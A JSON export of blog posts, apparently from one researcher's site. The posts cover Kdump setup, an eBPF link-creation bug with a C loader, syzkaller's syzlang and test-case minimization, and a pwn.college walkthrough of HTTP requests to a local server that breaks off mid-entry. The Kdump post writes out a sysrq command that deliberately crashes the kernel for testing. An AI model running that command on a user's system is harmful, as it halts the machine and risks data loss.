[{"content":"Kdump在Linux环境下的配置 最近在交CNVD时用到了Kdump，用它来捕获系统崩溃后的崩溃信息，这里进行一个简单的记录。\nKdump原理 Kdump使用了一种双内核的结构，主内核正常运行，但会预留一块区域保存crashkernel，另一个是捕获内核，当主内核崩溃时，它会进入预留的区域运行。另一种关键技术是Kexec，主内核崩溃时会通过Kexec立即跳转到捕获内核中，捕获内核随机运行，读取主内核中的旧数据，保存下崩溃现场，数据保存完毕以后重启。\nKdump安装前的配置 vmlinux安装 安装Kdump之前，首先我们需要检查/usr/lib/debug下是否为空，如果为空我们需要下载带调试符号的内核镜像，Kdump的核心工具crash需要用它来分析生成的vmcore文件。可以用如下命令进行安装：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # GPG密钥导入 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys C8CAB6595FDFF622 codename=$(lsb_release -c | awk \u0026#39;{print $2}\u0026#39;) sudo tee /etc/apt/sources.list.d/ddebs.list \u0026lt;\u0026lt; EOF deb http://ddebs.ubuntu.com/ ${codename} main restricted universe multiverse deb http://ddebs.ubuntu.com/ ${codename}-security main restricted universe multiverse deb http://ddebs.ubuntu.com/ ${codename}-updates main restricted universe multiverse deb http://ddebs.ubuntu.com/ ${codename}-proposed main restricted universe multiverse EOF sudo apt-get update sudo apt-get install linux-image-$(uname -r)-dbgsym 安装完成之后，/usr/lib/debug目录下就会出现带符号调试信息的内核：\n系统配置 随后我们需要在系统启动时预留一部分内存给备用内核，修改/etc/default/grub，在GRUB_CMDLINE_LINUX中添加 crashkernel=auto（或指定大小如crashkernel=256M）。随后重启使其生效。\nKdump安装与配置 Ubuntu中的安装指令如下：\n1 sudo apt install linux-crashdump 安装的过程中应该会有弹窗，让我们配置kexec-tools或者kdump-tools，我们也可以手动配置：\n1 2 sudo dpkg-reconfigure kexec-tools sudo dpkg-reconfigure kdump-tools 配置成功后，可以运行如下命令查看状态：\n1 kdump-config show Kdump测试 运行如下命令触发系统崩溃：\n1 2 sudo sh -c \u0026#34;echo 1 \u0026gt; /proc/sys/kernel/sysrq\u0026#34; sudo sh -c \u0026#34;echo c \u0026gt; /proc/sysrq-trigger\u0026#34; 系统崩溃重启以后可以在/var/crash/目录下看到崩溃转储的vmcore和dmesg信息：\n参考 https://blog.csdn.net/Javachichi/article/details/139823714\nhttps://blog.csdn.net/dwh0403/article/details/123551691\n","date":"2026-01-28T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/hello-kdump/","title":"kdump 系统配置"},{"content":"Error Debugging: Bpf_Link_Create, Device or resource busy Debugging Process Today, I wrote an eBPF program with type BPF_PROG_TYPE_TRACING to trace the kernel function bpf_lsm_file_mprotect on a virtual machine created by Qemu.\n1 2 3 4 5 6 7 8 9 10 11 12 BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65528), BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65520), BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65512), BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65504), BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65496), BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65488), BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0xffffffd0), BPF_LD_MAP_FD(BPF_REG_1, map_30), BPF_EMIT_CALL(BPF_FUNC_map_peek_elem), BPF_LD_IMM64(BPF_REG_0, 0x0), BPF_EXIT_INSN() I loaded it with BPF_PROG_LOAD and tried to use BPF_LINK_CREATE to make it attached. But the link syscall failed and returned error code 19 which means Device or resource busy. That\u0026rsquo;s weird because before that, there was no other program or any thing else being hooked on bpf_lsm_file_mprotect.\nHowever, the program could be linked successfully on the host machine. This gave me some ideas for debugging.\nI first tried to figure out who was hooking bpf_lsm_file_mprotect. But it seems that there is no command could help me figure out the problem. During this process, I understand the relation between link and ftrace.\nAs the program could be linked on the host machine, I thought there must be some difference in kernel config between the host and virtural machine.\nFinally, I found that the kernel config CONFIG_DYNAMIC_FTRACE should be enabled. CONFIG_FUNCTION_TRACER also needs to be enabled as a dependency.\nWhy? The kernel configuration option CONFIG_DYNAMIC_FTRACE is mandatory for attaching eBPF programs, specifically those using the fentry or fexit tracing types, to kernel functions.\nWhen enabled, CONFIG_DYNAMIC_FTRACE ensures that the compiler inserts a small, patchable instruction (initially a NOP or \u0026ldquo;No Operation\u0026rdquo;) at the beginning of every traceable kernel function. This mechanism allows the kernel to dynamically patch the function\u0026rsquo;s entry point at runtime.\nWhen an eBPF program attempts to link to a function, the kernel uses this dynamic patching mechanism to replace the NOP with a jump instruction that redirects control flow to the eBPF helper code. Without this configuration, the necessary hook points are absent, leading to errors like Device or resource busy when attachment is attempted.\nCode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 #define _GNU_SOURCE #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;linux/bpf.h\u0026gt; #define BPF_STX_MEM(SIZE, DST, SRC, OFF)\t\\ ((struct bpf_insn) {\t\\ .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\t\\ .dst_reg = DST,\t\\ .src_reg = SRC,\t\\ .off = OFF,\t\\ .imm = 0 }) #define BPF_MOV64_REG(DST, SRC)\t\\ ((struct bpf_insn) {\t\\ .code = BPF_ALU64 | BPF_MOV | BPF_X,\t\\ .dst_reg = DST,\t\\ .src_reg = SRC,\t\\ .off = 0,\t\\ .imm = 0 }) #define BPF_ALU64_IMM(OP, DST, IMM)\t\\ ((struct bpf_insn) {\t\\ .code = BPF_ALU64 | BPF_OP(OP) | BPF_K,\t\\ .dst_reg = DST,\t\\ .src_reg = 0,\t\\ .off = 0,\t\\ .imm = IMM }) #define BPF_LD_IMM64_RAW_FULL(DST, SRC, OFF1, OFF2, IMM1, IMM2)\t\\ ((struct bpf_insn) {\t\\ .code = BPF_LD | BPF_DW | BPF_IMM,\t\\ .dst_reg = DST,\t\\ .src_reg = SRC,\t\\ .off = OFF1,\t\\ .imm = IMM1 }),\t\\ ((struct bpf_insn) {\t\\ .code = 0, /* zero is reserved opcode */\t\\ .dst_reg = 0,\t\\ .src_reg = 0,\t\\ .off = OFF2,\t\\ .imm = IMM2 }) /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */ #define BPF_LD_MAP_FD(DST, MAP_FD)\t\\ BPF_LD_IMM64_RAW_FULL(DST, BPF_PSEUDO_MAP_FD, 0, 0,\t\\ MAP_FD, 0) #define BPF_EMIT_CALL(FUNC)\t\\ ((struct bpf_insn) {\t\\ .code = BPF_JMP | BPF_CALL,\t\\ .dst_reg = 0,\t\\ .src_reg = 0,\t\\ .off = 0,\t\\ .imm = ((FUNC) - BPF_FUNC_unspec) }) #define BPF_EXIT_INSN()\t\\ ((struct bpf_insn) {\t\\ .code = BPF_JMP | BPF_EXIT,\t\\ .dst_reg = 0,\t\\ .src_reg = 0,\t\\ .off = 0,\t\\ .imm = 0 }) #define BPF_MOV64_IMM(DST, IMM)\t\\ ((struct bpf_insn) {\t\\ .code = BPF_ALU64 | BPF_MOV | BPF_K,\t\\ .dst_reg = DST,\t\\ .src_reg = 0,\t\\ .off = 0,\t\\ .imm = IMM }) #define offsetof(type, member)\t__builtin_offsetof(type, member) #define ARRAY_SIZE(x) (sizeof(x) / sizeof(*(x))) static inline __u64 ptr_to_u64(const void *ptr) { return (__u64) (unsigned long) ptr; } int bpf_map_create(uint32_t map_type, uint32_t key_size, uint32_t value_size, unsigned int max_entries, unsigned int flags) { union bpf_attr attr = {.map_type = map_type, .key_size = key_size, .value_size = value_size, .max_entries = max_entries, }; if (flags != -1) { attr.map_flags = flags; } return syscall(SYS_bpf, BPF_MAP_CREATE, \u0026amp;attr, 0x40); } int link_create(int prog_fd, int target_fd, uint32_t attach_type, uint32_t flags, uint32_t target_btf_id) { union bpf_attr attr = { .link_create.prog_fd = prog_fd, .link_create.target_fd = target_fd, .link_create.attach_type = attach_type, .link_create.flags = 8, }; return syscall(SYS_bpf, BPF_LINK_CREATE, \u0026amp;attr, sizeof(attr.link_create)); } // loads a prog and returns the FD int load_prog(struct bpf_insn *instructions, size_t insn_count) { printf(\u0026#34;%zu\\n\u0026#34;, insn_count); unsigned char log_buf[1000000] = {}; memset(log_buf, 0, 1000000); union bpf_attr attr ; attr.prog_type = BPF_PROG_TYPE_TRACING; attr.insns = (uint64_t)instructions; attr.insn_cnt = insn_count; attr.license = (uint64_t) \u0026#34;GPL\u0026#34;; attr.log_size = sizeof(log_buf); attr.log_buf = (uint64_t)log_buf; attr.log_level = 3; attr.attach_btf_id = 116106;///*btf_id*/; attr.expected_attach_type = BPF_TRACE_FENTRY; // load the BPF program int prog_fd = syscall(SYS_bpf, BPF_PROG_LOAD, \u0026amp;attr, sizeof(attr)); printf(\u0026#34;prog_fd = %d\\n\u0026#34;, prog_fd); if (prog_fd \u0026lt; 0) { for (int i = 0; i \u0026lt; sizeof(log_buf) \u0026amp;\u0026amp; log_buf[i] != \u0026#39;\\0\u0026#39;; i++) { if (log_buf[i] != \u0026#39;\\n\u0026#39;) { printf(\u0026#34;%c\u0026#34;,log_buf[i]); } else { printf(\u0026#34;\\n\u0026#34;); } } printf(\u0026#34;%s\\n\u0026#34;, strerror(errno)); // printf(\u0026#34;could load program\\n\u0026#34;); return -1; } return prog_fd; } int load_run_bpf_insn() { int map_id=bpf_map_create(BPF_MAP_TYPE_BLOOM_FILTER, 0, 4, 32, -1); printf(\u0026#34;create map map_30: %d\\n\u0026#34;, map_id); struct bpf_insn prog[] = { BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65528), BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65520), BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65512), BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65504), BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65496), BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_1, 65488), BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0xffffffd0), BPF_LD_MAP_FD(BPF_REG_1, map_id), BPF_EMIT_CALL(BPF_FUNC_map_peek_elem), BPF_MOV64_IMM(BPF_REG_0, 0x0), BPF_EXIT_INSN() }; int prog_fd = load_prog(prog, /*prog_len=*/sizeof(prog) / sizeof(prog[0])); if ( prog_fd \u0026lt; 0) { printf(\u0026#34;Could not load program\\n\u0026#34;); return -1; } int link = link_create(prog_fd, 0, BPF_TRACE_FENTRY, 0, 0); int link2 = link_create(prog_fd, 0, BPF_TRACE_FENTRY, 0, 0); printf(\u0026#34;link created: %d\\n\u0026#34;, link); printf(\u0026#34;link2 created: %d\\n\u0026#34;, link2); if(link2\u0026lt;0){ perror(\u0026#34;link2 create failed\u0026#34;); int err=errno; printf(\u0026#34;error code: %d\\n\u0026#34;, err); } } int main(int argc, char **argv) { load_run_bpf_insn(); } Referrence https://www.kernelconfig.io/index.html\n","date":"2025-11-14T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/hello-bpf_link_create/","title":"bpf_link_create Device or resource busy"},{"content":"syzkaller syzlang 今天开一个新坑，我们来分析一下syzkaller的syzlang机制，这也是syzkaller设计上非常巧思的一个部分。我们将会看到，一个简单的txt文件，最终是如何被syzkaller构造为一个包含了详尽参数的系统调用并在qemu中执行的。\n内容包括：\nsyzlang文档以及加载 从参数到系统调用 从系统调用到程序 syzlang模板以及加载 syzlang与类型 syzlang是syzkaller对系统调用的描述性语言，简单来说就是它会告诉你一个系统调用是由哪些参数组成的，会返回什么类型的返回值。syzlang文档集中在sys/linux目录下。\nsyzkaller在prog/types.go文件中对类型进行了详细的描述。类型包括诸如：\nConstType、IntType、FlagsType、LenType、ProcType、CsumType，这一部分都是整数类型，但各有其特定的含义。\nPtrType、VmaType，指针类型。\nBufferType，字节缓冲区类型。\nStructType、ArrayType，结构体和数组类型。\nUnionType，联合体类型。\nResourceType，资源类型，这是我认为十分巧妙的一种类型。资源一方面如同货物一般，它反映出一个系统调用需要哪些资源，能创造哪些资源，另一方面它也是桥梁，它反映了系统调用之间的参数传递与依赖关系。有的系统调用能够创建另一个系统调用所需的资源，这使得不同的系统调用相互关联了起来。syzkaller在创建模糊测试用例时，可以通过资源将系统调用有逻辑地组合起来，形成特殊的语义，而非盲目生成。不过它只能显式反映系统调用之间的依赖组合关系，对于那些没有明面展示在参数关系上的隐式依赖关系，它无法识别，这也是目前的学术方向之一。\n从txt到go syzlang模板大致长这个样子，可以大致看出各种系统调用的性状：\nsyz-sysgen会读取这些文件，然后将其转换成类似AST语法树的结构，随后调用compiler.Compile函数将其转换为syzkaller中定义的Resource、Syscall、Type结构，将其序列化并存储到sys/gen/*.gob.flate中，后续由fuzzer读取并使用。\n除此以外，还会输出以下文件：\nregister.go: 负责在运行时将编译好的 Syzlang 数据文件 (.gob.flate) 注册到 Syzkaller 框架中，使其能够访问。\ndefs.h: C 语言头文件，包含跨架构的宏定义和结构体定义，例如：\n1 2 3 4 5 #define GOOS \u0026#34;linux\u0026#34; #define SYZ_PAGE_SIZE 4096 struct call_props_t（ syscalls.h: C 语言头文件，定义一个名为 syscalls 的常量数组，其中包含了每个系统调用的名称、系统调用号（NR）、属性和调用地址。syz-executor会读取并执行这个数组中的系统调用。\n从参数到系统调用 参数 参数，即Arg结构，这一部分的定义存储在prog/prog.go文件中。\n1 2 3 4 5 6 7 8 type Arg interface { Type() Type Dir() Dir Size() uint64 validate(ctx *validCtx, dir Dir) error serialize(ctx *serializer) } 最基础的Arg接口定义中，包含了类型（Type）、方向（Dir，即这个参数是需要写入的还是读出的，抑或是双向的）、大小（Size）。\n基础的参数类型一共有6中，分别是：\nConstArg: 很好理解，它代表一切和数字相关的变量，比如func x(int a)中的a就是一个ConstArg\nPointerArg: 指针类型的变量，它会指向一个地址，这个地址中又会存储一种其他类型的变量。\nDataArg： 一般用作缓冲区，既可以存入也可以写出\nGroupArg：可以理解为结构体或者数组，它一般会是各种类型变量的集合。\nUnionArg：联合体，它也代表各种类型变量的集合，但是只能选取其中之一。\nResultArg：结果类型的变量，它代表这个变量可以是其他系统调用的返回值。\n各个参数类型的具体定义在这里就不详细展开了，大家可以去看源文件，Syzkaller对各种类型的参数的定义很精巧。\n每种参数都有对应的MakeXXArg方法，用以相关参数类型的构造。例如MakeConstArg：\n1 2 3 func MakeConstArg(t Type, dir Dir, v uint64) *ConstArg { return \u0026amp;ConstArg{ArgCommon: ArgCommon{ref: t.ref(), dir: dir}, Val: v} } 传入参数的类型、方向以及一个uint64类型的整数，我们就可以得到一个ConstArg类型的变量。复杂一点的如MakeGroupArg，我们需要传入一个Arg数组，这个数组中包含了结构体每一个成员变量转化成的Arg。\n变量是可以多重嵌套的，借用syzlang模板中的例子：\n1 bpf$MAP_CREATE(cmd const[BPF_MAP_CREATE], arg ptr[in, bpf_map_create_arg], size len[arg]) fd_bpf_map 这是bpf系统调用bpf_map_create的syzlang描述，其中的第二个参数arg ptr[in, bpf_map_create_arg]最外层是一个指针类型的变量，随后是第二层：\n1 2 3 4 bpf_map_create_arg [ base\tbpf_map_create_arg_base bloom_filter\tbpf_map_create_arg_bf ] [varlen] 这是一个联合体类型的变量，包括base或者bloom_filter类型，我们在构造的时候只能选其中之一，随后是第三层：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 type bpf_map_create_arg_t[TYPE, KSIZE, VSIZE, MAX, FLAGS, MAP_EXTRA] { type\tTYPE ksize\tKSIZE vsize\tVSIZE max\tMAX flags\tFLAGS inner\tfd_bpf_map[opt] node\tint32 map_name\tarray[const[0, int8], BPF_OBJ_NAME_LEN] map_ifindex\tifindex[opt] btf_fd\tfd_btf[opt] btf_key_type_id\tbtf_opt_type_id btf_value_type_id\tbtf_opt_type_id btf_vmlinux_type_id\tbtf_opt_type_id map_extra\tMAP_EXTRA # NEED: value_type_btf_obj_fd should also depend on the map type but AND operators are not yet supported in conditional fields. value_type_btf_obj_fd\tfd_btf\t(if[value[flags] \u0026amp; BPF_F_VTYPE_BTF_OBJ_FD != 0]) pad1\tconst[0, int32]\t(if[value[flags] \u0026amp; BPF_F_VTYPE_BTF_OBJ_FD == 0]) map_token_fd\tfd_bpf_token\t(if[value[flags] \u0026amp; BPF_F_TOKEN_FD != 0]) pad2\tconst[0, int32]\t(if[value[flags] \u0026amp; BPF_F_TOKEN_FD == 0]) } [packed] type bpf_map_create_arg_base bpf_map_create_arg_t[flags[bpf_map_type, int32], int32, int32, int32, flags[map_flags, int32], const[0, int64]] type bpf_map_create_arg_bf bpf_map_create_arg_t[const[BPF_MAP_TYPE_BLOOM_FILTER, int32], int32, int32, int32, flags[map_flags, int32], int64[0:15]] 这里的定义十分灵活，第三层的描述是bpf_map_create_arg_t，一个GroupArg。但是base和bloom_filter对其中不同参数的类型做了不同的限定。这使得同一参数应用于不同场景时可以满足正确的约束。嵌套中仍然可以继续嵌套。\n系统调用 系统调用，即Call：\n1 2 3 4 5 6 7 type Call struct { Meta *Syscall Args []Arg Ret *ResultArg Props CallProps Comment string } 它的成员包括系统调用定义（Meta，Meta会记录系统调用相关的信息，如调用名、各种参数类型等）、参数（Args，参数实例数组）、返回值参数、属性（它代表如何控制或修改这次调用）、注释。\n从系统调用到程序 程序 程序就是Call的集合：\n1 2 3 4 5 6 7 8 type Prog struct { Target *Target Calls []*Call Comments []string // Was deserialized using Unsafe mode, so can do unsafe things. isUnsafe bool } executor运行 todo\n实战与结语 这里我将展示一段代码，运用上述逻辑手动生成一个socket系统调用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 func genSocketCall(r *randGen, s *state, domain int, sock_type int, proto int) (call *Call) { meta := r.target.SyscallMap[\u0026#34;socket\u0026#34;] //获取socket系统调用元数据 c := MakeCall(meta, nil) c.Args, _ = r.generateArgs(s, meta.Args, DirIn) // 生成第一个参数 domainArg := MakeConstArg(meta.Args[0].Type, DirIn, uint64(domain)) c.Args[0] = domainArg // 生成第二个参数 typeArg := MakeConstArg(meta.Args[1].Type, DirIn, uint64(sock_type)) c.Args[1] = typeArg // 生成第三个参数 protoArg := MakeConstArg(meta.Args[2].Type, DirIn, uint64(proto)) c.Args[2] = protoArg r.target.assignSizesCall(c) return c } Syzkaller作为当前最热门的内核模糊测试工具，具有极强的扩展性，养活了一批学者，还是很有分析的价值的，对syzlang到系统调用转换的分析或许可以帮助我们在以下几个方面做一些有价值的工作：\n扩充syzlang模板，做开源贡献（SyzDescribe、KernelGpt）\n生成特定类型的系统调用，集中测试内核的某个部分（BRF）\n系统调用之间的隐式依赖分析（Moonshine）\n","date":"2025-09-29T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/syzlang/","title":"syzkaller的syzlang机制探索"},{"content":"Syzkaller Testcase Minimization 这里开一个新坑，来探讨一下syzkaller测试用例最小化是如何实现的。\n最小化的意义 首先，为什么我们需要进行测试用例最小化。关于最小化的研究最早可以追溯到Zeller的文章Yesterday, my program worked. Today, it does not. Why?，文章中提出的Delta-Debug方法对后续的研究工作都有着极大的影响。\nSyzkaller是如何进行最小化的 Syzkaller对测试用例的最小化的主要功能集中在prog/minimize.go文件的Minimize函数中，这个函数会接收四个参数：\n参数 描述 p0 要简化的测试用例序列 callIndex0 目标系统调用下标 mode 简化模式 pred0 可以理解为验证函数，验证简化后的程序功能 函数最终将返回简化后的p0以及callIndex0。\n接下来我们将具体分析该函数，可以分为两个部分来看，一个是系统调用序列的最小化，另一个是系统调用参数的最小化。\n系统调用序列最小化 这一部分工作旨在尽可能移除无关的系统调用而仍使测试用例保留原有的功能（触发崩溃或维持覆盖率）。\n这部分功能由removeCalls函数实现，我们可以将其分为三个部分：切割、无关系统调用剔除、遍历筛选。\n1、切割\n首先，函数会移除所有在目标系统调用之后的系统调用，因为大部分情况下，这些系统调用不会影响目标系统调用的状态。\n1 2 3 4 5 6 7 8 9 10 11 if callIndex0 \u0026gt;= 0 \u0026amp;\u0026amp; callIndex0+2 \u0026lt; len(p0.Calls) { // It\u0026#39;s frequently the case that all subsequent calls were not necessary. // Try to drop them all at once. p := p0.Clone() for i := len(p0.Calls) - 1; i \u0026gt; callIndex0; i-- { p.RemoveCall(i) } if pred(p, callIndex0, statMinRemoveCall, \u0026#34;trailing calls\u0026#34;) { p0 = p } } 2、无关系统调用剔除\n随后，将调用函数removeUnrelatedCalls，移除和目标系统调用无关的系统调用。\n它首先调用函数relatedCalls，生成一个 map[int]bool 类型字典，字典表示每个系统调用和目标系统调用是否有关，随后遍历整个测试用例，将无关的系统调用删去，并测试功能是否完整。\nrelatedCalls函数会首先调用 uses 函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 func uses(call *Call) map[any]bool { used := make(map[any]bool) // 遍历所有的参数 ForeachArg(call, func(arg Arg, _ *ArgCtx) { switch typ := arg.Type().(type) { case *ResourceType: a := arg.(*ResultArg) used[a] = true if a.Res != nil { used[a.Res] = true } // args that use this arg for use := range a.uses { used[use] = true } case *BufferType: a := arg.(*DataArg) if a.Dir() != DirOut \u0026amp;\u0026amp; typ.Kind == BufferFilename { val := string(bytes.TrimRight(a.Data(), \u0026#34;\\x00\u0026#34;)) used[val] = true } } }) return used } 提取出目标系统调用使用的所有资源，将其存放在used map中。随后遍历所有其他系统调用，同样提取其使用的资源used1，将其与used进行比较，如果used1使用了used中使用过的资源，则认为该系统调用是相关的，并将used1合并到used中。\n3、遍历筛选\n随后，函数会倒序逐个移除系统调用，如果发现移除后，测试用例原功能丧失，则保留该系统调用，跳过对下一个系统调用进行测试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 for i := len(p0.Calls) - 1; i \u0026gt;= 0; i-- { if i == callIndex0 { continue } callIndex := callIndex0 if i \u0026lt; callIndex { callIndex-- } p := p0.Clone() p.RemoveCall(i) //移除克隆者的系统调用 if !pred(p, callIndex, statMinRemoveCall, fmt.Sprintf(\u0026#34;call %v\u0026#34;, i)) { continue //功能丧失则跳过 } p0 = p callIndex0 = callIndex } 系统调用参数最小化 这一部分改天更新。\nSyzkaller的最小化场景 Syzkaller最小化的场景有如下几种：Fuzz运行时、崩溃复现\nFuzz运行时 这一部分我们可以看job.go中的代码，从它给prog.minimize传递的pred函数可以发现，这里最小化的功能完整性体现在经过最小化之后，目标系统调用的覆盖率并没有减小。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 p, call := prog.Minimize(job.p, call, mode, func(p1 *prog.Prog, call1 int) bool { if stop { return false } var mergedSignal signal.Signal for i := 0; i \u0026lt; minimizeAttempts; i++ { ... if !reexecutionSuccess(result.Info, info.errno, call1) { // The call was not executed or failed. continue } // 获取目标call执行后的signal thisSignal := getSignalAndCover(p1, result.Info, call1) if mergedSignal.Len() == 0 { mergedSignal = thisSignal } else { mergedSignal.Merge(thisSignal) } // signal没有发生变化，signal的长度相等 if info.newStableSignal.Intersection(mergedSignal).Len() == info.newStableSignal.Len() { ... return true } } ... return false }) 系统调用与系统调用之间存在着隐式与显式的依赖关系，一个系统调用可能会对另一个系统调用产生一些影响，使其执行后的覆盖率发生变化，经过最小化处理后，测试用例会删去那些对目标系统调用无关的系统调用。\n崩溃复现 这一部分内容我们可以参考syz-repro工具的原理，在一个测试用例触发崩溃之后，syzkaller会进行最小化，提取出能出发崩溃的最小测试用例。\n在实现上和上一个流程基本相同，但在调用Minimize函数时，会将callIndex设置为-1，这将跳过切割与无关剔除步骤，直接遍历每个系统调用，观察删去该系统调用之后，崩溃是否还能成功触发。\n","date":"2025-07-01T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/syz-minimization/","title":"Syzkaller Testcase Minimization"},{"content":"PWN Web 我将在这里记录pwn.college中和web相关部分的练习。\nPlaying With Programs - Talking Web 这一章节涉及到的是一些web相关的程序以及命令的基础用法，为后面进阶的内容打基础。\nlevel1 - level4 这部分内容比较简单，就跳过了。\nlevel5 - level6 这一关用到了netcat，也就是nc。netcat提供了一个和server交互的窗口用于构造请求。\n首先连接server：nc 127.0.0.1 80，连接完成以后，按照如下格式构造请求：GET / HTTP/1.1。分别代表请求类型，路径，协议。随后netcat会自动构造完整的请求。\nlevel6 同理，只不过多了一个/verify路径：GET /verify HTTP/1.1 。整个命令可以用一行表示 echo -e \u0026quot;GET /verify HTTP/1.1\\n\u0026quot; | nc 127.0.0.1 80。\nlevel7 这一关使用 curl 构造请求：curl 127.0.0.1:80/complete 。\ncurl直接使用时，构造的是GET请求。加上\u0026ndash;data时，构造的是POST请求。\nlevel8 这一关使用python写一个小脚本。\n1 2 3 4 5 #!/usr/bin/python import requests response=requests.get(\u0026#34;http://127.0.0.1:80/challenge\u0026#34;) print(response.content) level9-level11 这几关需要设置特殊的header，指定header中的host。Host的作用是让server知道请求的是哪一个网站，因为一个IP可能对应多个域名，server需要指导用户请求的域名到底是哪一个。\nlevel9 使用python。\n1 2 3 4 5 6 7 8 9 #!/usr/bin/python import requests header = { \u0026#34;Host\u0026#34;:\u0026#34;webhacking.kr:80\u0026#34; } response=requests.get(\u0026#34;http://127.0.0.1:80/submit\u0026#34;, headers=header) print(response.content) level10 使用curl设置header Host。\n1 curl -H \u0026#34;Host:net-force.nl:80\u0026#34; 127.0.0.1:80/task level11 使用netcat设置请求头。\n1 echo -e \u0026#34;GET /fulfill HTTP/1.1\\nHost: 0xf.at:80\\n\\n\u0026#34; | nc 127.0.0.1 80 level12 这一关提到了一个问题，就是路径可能是包含空格的，这种情况下使用nc构造请求时，要将路径中的空格用编码代替将其连接起来，否则会出现解析错误。\n1 2 echo -e \u0026#34;GET /progress%20request%20qualify HTTP/1.1\\nHost:challenge.localhost:80\\n\\n\u0026#34; | nc 127.0.0.1 80 level13-15 这几关提到了parameter问题，即GET请求的参数问题。使用方式也很简单，在路径末尾使用 ?para=value 即可。\nlevel13：curl -H \u0026quot;Host:challenge.localhost:80\u0026quot; http://127.0.0.1:80/gate?unlock=pwgklefy\n当然，参数可能是不只一个的，这种情况下用\u0026amp;将参数分隔开即可，注意之间不要加空格。\nlevel14：\n1 echo -e \u0026#34;GET /authenticate?secure_key=jcbaywzw\u0026amp;private_key=miwgzszt\u0026amp;access_code=buadbiky HTTP/1.1\\nHost:challenge.localhost:80\\n\\n\u0026#34; | nc 127.0.0.1 80 level15：\n注意这里需要将IP用双引号括起来，因为\u0026amp;在shell中有特殊的含义，会出现错误。\n1 2 curl -H \u0026#34;Host:challenge.localhost:80\u0026#34; \u0026#34;http://127.0.0.1:80/progress?keycode=wrgcvc sy\u0026amp;security_token=zlptrsug\u0026amp;secret_key=eectkeks\u0026#34; level16-level22 这几关涉及到了POST请求的form填写。\nlevel16很简单，在网页填个表格就可以了。\nlevel17使用curl完成任务：curl -H \u0026quot;Host:challenge.localhost:80\u0026quot; -d \u0026quot;pass=wrxfcbng\u0026quot; http://127.0.0.1:80/challenge\nlevel18使用netcat：\n1 2 3 4 5 6 POST /pass HTTP/1.1 Host: challenge.localhost:80 Content-Type: application/x-www-form-urlencoded Content-Length: 15 verify=kuzyuwlx level19使用python：\n1 2 3 4 5 6 7 8 9 10 #!/usr/bin/python import requests header = { \u0026#34;Host\u0026#34;:\u0026#34;challenge.localhost:80\u0026#34; } response=requests.post(\u0026#34;http://127.0.0.1:80/fulfill\u0026#34;, headers=header, data={\u0026#34;access_code\u0026#34;:\u0026#34;dezevikr\u0026#34;}) print(response.content) level20，这一个要求用firefox浏览器发送一个POST请求，不过其实仍然可以用python等工具完成这个任务，只用在User-Agent字段中加入Firefox就可以了。\n1 2 3 4 5 6 7 8 9 10 #!/usr/bin/python import requests header = { \u0026#34;Host\u0026#34;:\u0026#34;challenge.localhost:80\u0026#34;, \u0026#34;User-Agent\u0026#34;:\u0026#34;Firefox\u0026#34; } response=requests.post(\u0026#34;http://127.0.0.1:80/progress\u0026#34;, headers=header, data={\u0026#34;secure_key\u0026#34;:\u0026#34;cfezlwph\u0026#34;}) print(response.content) level21 使用curl完成表格多内容的POST请求：\n1 curl -H \u0026#34;Host:challenge.localhost:80\u0026#34; -d \u0026#34;hash=abnydllx\u0026#34; -d \u0026#34;unlock=hoskplkb\u0026#34; -d \u0026#34;auth_key=wknbddgj\u0026#34; http://127.0.0.1:80/check 对于多个form数据，用多个-d表示\nlevel22 使用netcat完成多表格任务：\n1 2 3 4 5 6 POST /validate 